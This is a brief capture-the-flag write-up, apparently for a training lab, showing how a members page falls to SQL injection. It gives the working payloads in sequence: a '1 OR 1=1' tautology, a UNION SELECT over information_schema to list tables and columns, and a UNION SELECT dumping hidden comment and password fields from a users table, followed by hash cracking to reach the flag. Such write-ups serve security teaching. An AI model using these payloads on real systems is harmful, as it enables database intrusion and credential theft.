First, try the most basic SQL Injection there is:
    1 OR 1=1
And immediately you get the results that shows it works. Meaning that the server
uses straight SQL quiries in it's code and at the end has WHERE id=<user_input>

Among the info from our first query there is a clue:
    First name: Flag
    Surname : GetThe

After trying different SELECTs with wildecard (*) and different number
of parameters you find that the hack only works with 2.

Now, since we're at the members page we need to find a table for members/users/accounts/profiles
and columns for it:
    1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
At the end you find 'users' table with the following columns:
    user_id
    first_name
    last_name
    town
    country
    planet
    Commentaire
    countersign

The ones you're looking for are 'Commentaire' and 'countersign':
    1 UNION SELECT Commentaire, countersign FROM users
By following the discovered instructions you get the flag.
    `md5 decode` gets you "FortyTwo" which you convert to lowercase
    `echo -n "fortytwo" | shasum -a 256` gets you the flag
